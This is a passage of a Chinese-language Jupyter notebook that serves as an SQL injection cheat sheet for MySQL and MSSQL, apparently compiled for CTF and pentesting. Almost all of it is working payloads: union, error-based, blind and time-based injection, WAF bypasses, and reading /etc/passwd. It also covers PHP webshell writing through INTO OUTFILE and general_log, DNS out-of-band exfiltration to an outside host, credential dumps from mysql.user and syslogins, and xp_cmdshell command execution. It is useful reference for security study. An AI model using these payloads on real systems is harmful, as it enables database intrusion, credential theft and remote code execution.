   "metadata": {},
   "source": [
    "### Concatenation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CONCAT('a', 'b') => 'ab'\n",
    "如果任何一欄為NULL，則返回NULL\n",
    "CONCAT_WS(分隔符, 字串1, 字串2...)\n",
    "CONCAT_WS('@', 'gg', 'inin') => gg@inin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Cast function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "CAST('125e342.83' AS signed) => 125\n",
    "CONVERT('23',SIGNED) => 23"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Delay function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "sleep(5)\n",
    "BENCHMARK(count, expr)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空白字元"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "09 0A 0B 0C 0D A0 20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File-read function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "LOAD_FILE('/etc/passwd')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### File-write"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "INTO DUMPFILE\n",
    "    適用binary (寫入同一行)\n",
    "INTO OUTFILE\n",
    "    適用一般文本 (有換行)\n",
    "寫webshell\n",
    "    需知道可寫路徑\n",
    "    UNION SELECT \"<? system($_GET[1]);?>\",2,3 INTO OUTFILE \"/var/www/html/temp/shell.php\"\n",
    "權限\n",
    "    SELECT file_priv FROM mysql.user\n",
    "secure-file-priv\n",
    "    限制MySQL導入導出\n",
    "        load_file, into outfile等\n",
    "    運行時無法更改\n",
    "    MySQL 5.5.53前，該變數預設為空(可以導入導出)\n",
    "    e.g. secure_file_priv=E:\\\n",
    "        限制導入導出只能在E:\\下\n",
    "    e.g. secure_file_priv=null\n",
    "        限制不允許導入導出\n",
    "    secure-file-priv限制下用general_log拿shell\n",
    "    SET global general_log='on';\n",
    "\n",
    "    SET global general_log_file='C:/phpStudy/WWW/cmd.php';\n",
    "\n",
    "    SELECT '<?php assert($_POST[\"cmd\"]);?>';"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IF語句"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IF(condition,true-part,false-part)\n",
    "SELECT IF (1=1,'true','false')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Hex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT X'5061756c'; => paul\n",
    "SELECT 0x5061756c; => paul\n",
    "SELECT 0x5061756c+0 => 1348564332\n",
    "SELECT load_file(0x2F6574632F706173737764);\n",
    "    /etc/passwd\n",
    "可繞過一些WAF\n",
    "    e.g. 用在不能使用單引號時(' => \\')\n",
    "    CHAR()也可以達到類似效果\n",
    "        'admin' => CHAR(97, 100, 109, 105, 110)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 註解"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#\n",
    "--\n",
    "/**/\n",
    "一個*/可以閉合前面多個/*\n",
    "/*! 50001 select * from test */\n",
    "    可探測版本\n",
    "    e.g. SELECT /*!32302 1/0, */ 1 FROM tablename\n",
    "`\n",
    "    MySQL <= 5.5\n",
    ";\n",
    "    PDO支援多語句"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### information_schema"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mysql >= 5.0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Stacking Query"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "預設PHP+MySQL不支援Stacking Query\n",
    "但PDO可以Stacking Query"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其它"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "同version()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### user()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "current_user\n",
    "current_user()\n",
    "current user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### system_user()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "database system user"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### database()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "schema()\n",
    "current database"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@basedir"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MySQL安裝路徑"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@datadir"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Location of db file"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@plugin_dir"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@hostname"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@version_compile_os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Operating System"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@version_compile_machine"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### @@innodb_version"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### MD5()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### SHA1()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### COMPRESS() / UNCOMPRESS()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### group_concat()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "合併多條結果\n",
    "    e.g. select group_concat(username) from users; 一次返回所有使用者名\n",
    "group_concat_max_len = 1024 (default)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### json_arrayagg()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MySQL >= 5.7.22\n",
    "同上\n",
    "e.g. SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### greatest()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "greatest(a, b)返回a, b中最大的\n",
    "greatest(1, 2)=2\n",
    "    1\n",
    "greatest(1, 2)=1\n",
    "    0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### between a and b"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "介於a到b之間\n",
    "greatest(1, 2) between 1 and 3\n",
    "    1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### regexp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT 'abc' regexp '.*'\n",
    "    1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Collation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "*_ci case insensitive collation 不區分大小寫\n",
    "*_cs case sensitive collation 區分大小寫\n",
    "*_bin binary case sensitive collation 區分大小寫"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Union Based"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 判斷column數"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "union select 1,2,3...N\n",
    "order by N 找最後一個成功的N"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### AND 1=2 UNION SELECT 1, 2, password FROM admin--+"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### LIMIT N, M 跳過前N筆，抓M筆"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 爆資料庫名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "union select 1,2,schema_name from information_schema.schemata limit 1,1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 爆表名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "union select 1,2,table_name from information_schema.tables where table_schema='mydb' limit 0,1\n",
    "union select 1,2,table_name from information_schema.columns where table_schema='mydb' limit 0,1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 爆Column名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "union select 1,2,column_name from information_schema.columns where table_schema='mydb' limit 0,1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### MySQL User"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT CONCAT(user, \":\" ,password) FROM mysql.user;"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Error Based"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 長度限制"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "錯誤訊息有長度限制\n",
    "#define ERRMSGSIZE (512)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MySQL > 5.5.5 overflow才會有錯誤訊息\n",
    "SELECT ~0 => 18446744073709551615\n",
    "SELECT ~0 + 1 => ERROR\n",
    "SELECT exp(709) => 8.218407461554972e307\n",
    "SELECT exp(710) => ERROR\n",
    "若查詢成功，會返回0\n",
    "    SELECT exp(~(SELECT * FROM (SELECT user())x));\n",
    "    ERROR 1690(22003):DOUBLE value is out of range in 'exp(~((SELECT 'root@localhost' FROM dual)))'\n",
    "select (select(!x-~0)from(select(select user())x)a);\n",
    "    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'\n",
    "    MySQL > 5.5.53 不會顯示查詢結果"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### xpath"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "extractvalue (有長度限制，32位)\n",
    "    select extractvalue(1,concat(0x7e,(select @@version),0x7e));\n",
    "    ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'\n",
    "updatexml (有長度限制，32位)\n",
    "    select updatexml(1,concat(0x7e,(select @@version),0x7e),1);\n",
    "    ERROR 1105 (HY000): XPATH syntax error: '~5.7.17~'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 主鍵重複"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select count(*) from test group by concat(version(),floor(rand(0)*2));\n",
    "    ERROR 1062 (23000): Duplicate entry '5.7.171' for key '<group_key>'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 其它函數 (5.7)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select ST_LatFromGeoHash(version());\n",
    "select ST_LongFromGeoHash(version());\n",
    "select GTID_SUBSET(version(),1);\n",
    "select GTID_SUBTRACT(version(),1);\n",
    "select ST_PointFromGeoHash(version(),1);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 爆庫名、表名、字段名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "當過濾information_schema等關鍵字時，可以用下面方法爆庫名\n",
    "    select 1,2,3 from users where 1=abc();\n",
    "    ERROR 1305 (42000): FUNCTION fl4g.abc does not exist\n",
    "爆表名\n",
    "    select 1,2,3 from users where Polygon(id);\n",
    "    select 1,2,3 from users where linestring(id);\n",
    "    ERROR 1367 (22007): Illegal non geometric '`fl4g`.`users`.`id`' value found during parsing\n",
    "爆Column\n",
    "    select 1,2,3 from users where (select * from (select * from users as a join users as b)as c);\n",
    "        ERROR 1060 (42S21): Duplicate column name 'id'\n",
    "    select 1,2,3 from users where (select * from (select * from users as a join users as b using(id))as c);\n",
    "        ERROR 1060 (42S21): Duplicate column name 'username'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Blind Based (Time/Boolean)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Boolean"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "「有」跟「沒有」\n",
    "id=87 and length(user())>0\n",
    "id=87 and length(user())>100\n",
    "id=87 and ascii(mid(user(),1,1))>100\n",
    "id=87 or ((select user()) regexp binary '^[a-z]')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "用在啥結果都看不到時\n",
    "id=87 and if(length(user())>0, sleep(10), 1)=1\n",
    "id=87 and if(length(user())>100, sleep(10), 1)=1\n",
    "id=87 and if(ascii(mid(user(),1,1))>100, sleep(10), 1)=1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Out of Band"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Windows only\n",
    "select load_file(concat(\"\\\\\\\\\",schema_name,\".dns.kaibro.tw/a\")) from information_schema.schemata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 繞過空白檢查"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "id=-1/**/UNION/**/SELECT/**/1,2,3\n",
    "id=-1%09UNION%0DSELECT%0A1,2,3\n",
    "id=(-1)UNION(SELECT(1),2,3)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 寬字節注入"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "addslashes()會讓'變\\'\n",
    "在GBK編碼中，中文字用兩個Bytes表示\n",
    "    其他多字節編碼也可\n",
    "    但要低位範圍有包含0x5c(\\)\n",
    "第一個Byte要>128才是中文\n",
    "%df' => %df\\' => 運' (成功逃逸)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Order by注入"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 可以透過asc、desc簡單判斷"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "?sort=1 asc\n",
    "?sort=1 desc"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 後面不能接UNION"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 已知字段名 (可以盲注)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "?order=IF(1=1, username, password)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 利用報錯"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "?order=IF(1=1,1,(select 1 union select 2)) 正確\n",
    "?order=IF(1=2,1,(select 1 union select 2)) 錯誤\n",
    "?order=IF(1=1,1,(select 1 from information_schema.tables)) 正常\n",
    "?order=IF(1=2,1,(select 1 from information_schema.tables)) 錯誤\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Time Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "?order=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 正常\n",
    "?order=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) sleep 2秒"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### group by with rollup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "' or 1=1 group by pwd with rollup limit 1 offset 2#"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 將字串轉成純數字"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "字串 -> 16進位 -> 10進位\n",
    "conv(hex(YOUR_DATA), 16, 10)\n",
    "還原：unhex(conv(DEC_DATA,10,16))\n",
    "需注意不要Overflow"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 不使用逗號"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "LIMIT N, M => LIMIT M OFFSET N\n",
    "mid(user(), 1, 1) => mid(user() from 1 for 1)\n",
    "UNION SELECT 1,2,3 => UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 快速查找帶關鍵字的表"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select table_schema,table_name,column_name from information_schema.columns where table_schema !=0x696E666F726D6174696F6E5F736368656D61 and table_schema !=0x6D7973716C and table_schema !=0x706572666F726D616E63655F736368656D61 and (column_name like '%pass%' or column_name like '%pwd%');\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### innodb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "表引擎為innodb\n",
    "MySQL > 5.5\n",
    "innodb_table_stats、innodb_table_index存放所有庫名表名\n",
    "select table_name from mysql.innodb_table_stats where database_name=資料庫名;\n",
    "\n",
    "Example: Codegate2018 prequal - simpleCMS\n",
    "    https://github.com/w181496/CTF/tree/master/codegate2018-prequal/simpleCMS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Bypass WAF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select password => SelEcT password (大小寫)\n",
    "select password => select/**/password (繞空白)\n",
    "select password => s%65lect%20password (URLencode)\n",
    "select password => select(password) (繞空白)\n",
    "select password => select%0apassword (繞空白)\n",
    "    %09, %0a, %0b, %0c, %0d, %a0\n",
    "select password from admin => select password /*!from*/ admin (MySQL註解)\n",
    "information_schema.schemata => `information_schema`.schemata (繞關鍵字/空白)\n",
    "    select xxx from`information_schema`.schemata\n",
    "select pass from user where id='admin' => select pass from user where id=0x61646d696e (繞引號)\n",
    "    id=concat(char(0x61),char(0x64),char(0x6d),char(0x69),char(0x6e))\n",
    "?id=0e2union select 1,2,3 (科學記號)\n",
    "    ?id=1union select 1,2,3會爛\n",
    "    ?id=0e1union(select~1,2,3) (~)\n",
    "    ?id=.1union select 1,2,3 (點)\n",
    "WHERE => HAVING (繞關鍵字)\n",
    "AND => && (繞關鍵字)\n",
    "    OR => ||\n",
    "    = => LIKE\n",
    "    a = 'b' => not a > 'b' and not a < 'b'\n",
    "    > 10 => not between 0 and 10\n",
    "LIMIT 0,1 => LIMIT 1 OFFSET 0 (繞逗號)\n",
    "    substr('kaibro',1,1) => substr('kaibro' from 1 for 1)\n",
    "Multipart/form-data繞過\n",
    "http://xdxd.love/2015/12/18/%E9%80%9A%E8%BF%87multipart-form-data%E7%BB%95%E8%BF%87waf/\n",
    "    简单总结，通常文件上传的时候用的是multipart/form-data,传递普通参数用的x-www-form-urlencoded。\n",
    "    文件上传包含大量二进制数据，非字符数字组成的数据，如果使用urlencode，需要全部采用url编码。使得需要传输的数据膨胀。\n",
    "    \n",
    "偽造User-Agent\n",
    "e.g. 有些WAF不封google bot"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MSSQL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 子字串："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SUBSTRING(\"abc\", 1, 1) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Ascii function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "ascii('A') => 65\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Char function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "char(65) => 'a'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Concatenation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "+\n",
    "'a'+'b' => 'ab'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Delay function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "WAIT FOR DELAY '0:0:10'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 空白字元"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IF語句"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "IF condition true-part ELSE false-part\n",
    "IF (1=1) SELECT 'true' ELSE SELECT 'false'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 註解："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "--\n",
    "/**/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### TOP"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "MSSQL沒有LIMIT N, M的用法\n",
    "SELECT TOP 87 * FROM xxx \n",
    "\n",
    "取最前面87筆\n",
    "\n",
    "\n",
    "取第78~87筆\n",
    "SELECT pass FROM (SELECT pass, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS LIMIT FROM mydb.dbo.mytable)x WHERE LIMIT between 78 and 87\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 其它："
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "user\n",
    "db_name()\n",
    "user_name()\n",
    "@@version\n",
    "@@language\n",
    "@@servername\n",
    "host_name()\n",
    "has_dbaccess('master')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 查詢用戶"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select name, loginame from master..syslogins, master..sysprocesses"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 查用戶密碼"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "select user,password from master.dbo.syslogins"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 當前角色是否為資料庫管理員"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT is_srvrolemember('sysadmin')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 當前角色是否為db_owner"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT IS_MEMBER('db_owner')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆DB name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "DB_NAME(N)\n",
    "UNION SELECT NULL,DB_NAME(N),NULL--\n",
    "UNION SELECT NULL,name,NULL FROM master ..sysdatabases--\n",
    "SELECT catalog_name FROM information_schema.schemata\n",
    "1=(select name from master.dbo.sysdatabases where dbid=5)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆表名"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT table_catalog, table_name FROM information_schema.tables\n",
    "SELECT name FROM sysobjects WHERE xtype='U'\n",
    "ID=02';if (select top 1 name from DBname..sysobjects where xtype='U' and name not in ('table1', 'table2'))>0 select 1--\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 爆column"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "SELECT table_catalog, table_name, column_name FROM information_schema.columns\n",
    "SELECT name FROM syscolumns WHERE id=object_id('news')\n",
    "ID=1337';if (select top 1 col_name(object_id('table_name'), i) from sysobjects)>0 select 1--\n",
    "SELECT name FROM DBNAME..syscolumns WHERE id=(SELECT id FROM DBNAME..sysobjects WHERE name='TABLENAME')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Union Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "Column型態必須相同\n",
    "可用NULL來避免"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Error Based"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "利用型別轉換錯誤\n",
    "id=1 and user=0"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Out of Band"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "declare @p varchar(1024);set @p=(SELECT xxxx);exec('master..xp_dirtree \"//'+@p+'.oob.kaibro.tw/a\"')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 判斷是否站庫分離"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "客戶端主機名：select host_name();\n",
    "服務端主機名：select @@servername;\n",
    "兩者不同即站庫分離"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### xp_cmdshell"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "在MSSQL 2000默認開啟\n",
    "MSSQL 2005之後默認關閉\n",
    "有sa權限，可透過sp_configure重啟它\n",
    "EXEC sp_configure 'show advanced options',1\n",
    "RECONFIGURE \n",
    "EXEC sp_configure 'xp_cmdshell',1\n",
    "RECONFIGURE\n",
    "\n",
    "執行 command\n",
    "exec xp_cmdshell 'whoami'\n",
    "\n",
    "關閉xp_cmdshell\n",
    "\n",
    "EXEC sp_configure 'show advanced options', 1;\n",
    "RECONFIGURE;\n",
    "EXEC sp_configure'xp_cmdshell', 0;\n",
    "RECONFIGURE;"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 快速查找帶關鍵字的表"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
